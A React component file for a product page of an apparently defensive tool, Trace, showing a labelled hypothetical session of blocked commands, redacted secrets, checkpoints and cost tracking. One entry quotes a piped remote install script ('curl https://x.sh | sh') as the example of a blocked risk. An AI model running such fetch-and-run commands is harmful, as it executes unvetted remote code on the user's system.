import { Info } from "@phosphor-icons/react";
import { Reveal } from "./components";

/**
 * Illustrative only — Trace has no telemetry (see "Zero-cloud by default"
 * below), so there is no aggregate usage data to report. These numbers are
 * one hypothetical run, worked out by hand from the guard rules in
 * crates/trace-core/src/guard.rs, to make "what does a caught risk look
 * like" concrete instead of abstract.
 */
const EXAMPLE = [
  { value: "1", label: "destructive command blocked", detail: '"curl https://x.sh | sh" — piped install script, blocked by default' },
  { value: "1", label: "secret redacted before storage", detail: "an API key written to a config file, caught in the diff" },
  { value: "3", label: "checkpoints created", detail: "one per monitored run — any of them is a one-command rollback" },
  { value: "$0.06", label: "estimated cost tracked", detail: "provider + token usage, summed across the session" },
];

export default function Insights() {
  return (
    <div>
      <div className="mb-6 flex items-start gap-2 rounded-md bg-surface px-4 py-3 text-xs text-text-dim">
        <Info size={14} className="mt-0.5 shrink-0 text-text-dimmer" />
        <span>
          Illustrative example, not aggregated usage data — Trace collects no
          telemetry, so there is no fleet of runs to report on. This is one
          hypothetical session, worked out from the actual guard rules below.
        </span>
      </div>
      <div className="grid grid-cols-1 gap-6 sm:grid-cols-2 lg:grid-cols-4">
        {EXAMPLE.map((e, i) => (
          <Reveal key={e.label} delay={i * 0.05}>
            <div className="text-2xl font-semibold text-text">{e.value}</div>
            <div className="mt-1 text-sm font-medium text-text-dim">{e.label}</div>
            <div className="mt-1.5 text-xs text-text-dimmer">{e.detail}</div>
          </Reveal>
        ))}
      </div>
    </div>
  );
}
